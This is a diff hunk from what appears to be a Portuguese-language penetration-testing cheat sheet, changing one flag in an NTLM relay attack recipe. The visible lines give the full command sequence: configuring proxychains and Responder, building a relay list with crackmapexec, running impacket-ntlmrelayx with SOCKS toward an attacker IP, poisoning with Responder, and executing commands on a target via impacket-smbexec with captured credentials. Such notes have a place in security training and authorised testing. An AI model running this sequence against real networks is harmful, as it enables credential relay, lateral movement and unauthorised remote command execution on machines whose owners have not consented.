@@ -8753,7 +8753,7 @@ FAZ UM MITM ENTRE O SERVIDOR E A PESSOA QUE TA TENTANDO AUTENTICAR. PRECISA DE P
  	sudo nano /etc/proxychains.conf ADICIONAR socks4 127.0.0.1 1080
 	sudo nano /etc/responder/Responder.conf TROCAR SMB E HTTP para OFF
 	crackmapexec smb 192.168.2.32/38 --gen-relay-list relay.txt
-	TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm --socks -ip IP-ATACANTE
+	TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE
 	TERMINAL 2 sudo responder -I eth2
 	TERMINAL 3 proxychains impacket-smbexec -no-pass 'PRAIAS'/'LENITA'@'192.168.2.37' PRAIAS LENITA E O IP SAO IMPUTS CAPITURADOS DO RESPONDER E NTLMRELAY
  
